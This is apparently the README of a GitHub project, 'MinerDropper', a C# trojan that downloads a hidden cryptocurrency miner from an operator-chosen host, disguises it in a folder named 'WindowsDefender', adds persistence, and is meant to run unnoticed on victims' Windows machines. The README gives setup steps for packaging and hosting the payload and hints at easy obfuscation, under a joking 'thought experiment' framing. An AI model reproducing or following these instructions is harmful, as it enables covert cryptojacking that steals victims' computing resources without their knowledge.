# MinerDropper

A trojan horse that drops a portable runtime of MinerGate's CLI CPU cryptocurrency miner. Includes basic persistance.

# What

Built in C#, MinerDropper.exe is a compiled version of **Dropper**, which downloads a zip that you should make out of a miner from https://minergate.com/downloads/, I'm using the Windows x64 console version. 

Inside of that same directory, put the compiled version of **Hide** (https://github.com/DylanAlloy/MinerDropper/tree/master/Hide/Hide/bin/Debug) in there, and name it 'run.exe'. Put all of this (the miner you downloaded and the compiled **Hide**) in a folder called 'WindowsDefender' and host it somewhere after zipping it up. 

There are comments in the code for where you edit the values, i.e. the download source. You can edit the other variables too if you feel like it, it's not complicated when you read what it's doing.

# Why

Idk, it occurs to anyone who ends up mining. It's just a thought experiment ;) 

# Notes

It gets flagged by Windows Defender every step of the way. No serious attempt at obfuscation though it would be really easy...
plenty of literature on the subject.

That being said, once it's running, you'll never notice it. Nothing will seem to have happened at all. Easy to get rid of however. 
